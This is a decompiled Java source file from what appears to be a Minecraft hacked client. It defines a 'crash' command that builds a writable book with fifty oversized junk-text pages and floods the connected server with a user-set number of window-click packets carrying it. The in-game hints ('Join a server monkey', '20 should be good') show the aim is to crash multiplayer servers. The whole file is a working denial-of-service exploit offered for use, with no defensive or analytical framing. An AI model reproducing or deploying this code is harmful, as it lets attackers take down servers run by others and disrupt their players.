// 
// Decompiled by Procyon v0.5.36
// 

package com.esoterik.client.features.command.commands;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.inventory.ClickType;
import com.esoterik.client.util.Util;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;
import net.minecraft.client.Minecraft;
import com.esoterik.client.features.command.Command;

public class CrashCommand extends Command
{
    int packets;
    
    public CrashCommand() {
        super("crash", new String[] { "crash" });
    }
    
    @Override
    public void execute(final String[] commands) {
        new Thread("crash time trololol") {
            @Override
            public void run() {
                if (Minecraft.getMinecraft().getCurrentServerData() == null || Minecraft.getMinecraft().getCurrentServerData().serverIP.isEmpty()) {
                    Command.sendMessage("Join a server monkey");
                    return;
                }
                if (commands[0] == null) {
                    Command.sendMessage("Put the number of packets to send as an argument to this command. (20 should be good)");
                    return;
                }
                try {
                    CrashCommand.this.packets = Integer.parseInt(commands[0]);
                }
                catch (NumberFormatException e) {
                    Command.sendMessage("Are you sure you put a number?");
                    return;
                }
                final ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
                final NBTTagList list = new NBTTagList();
                final NBTTagCompound tag = new NBTTagCompound();
                final int pages = Math.min(50, 100);
                final String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                for (int i = 0; i < pages; ++i) {
                    final String siteContent = size;
                    final NBTTagString tString = new NBTTagString(siteContent);
                    list.appendTag((NBTBase)tString);
                }
                tag.setString("author", Util.mc.player.getName());
                tag.setString("title", "client > all :^D");
                tag.setTag("pages", (NBTBase)list);
                bookObj.setTagInfo("pages", (NBTBase)list);
                bookObj.setTagCompound(tag);
                for (int i = 0; i < CrashCommand.this.packets; ++i) {
                    Util.mc.playerController.connection.sendPacket((Packet)new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short)0));
                }
            }
        }.start();
    }
}
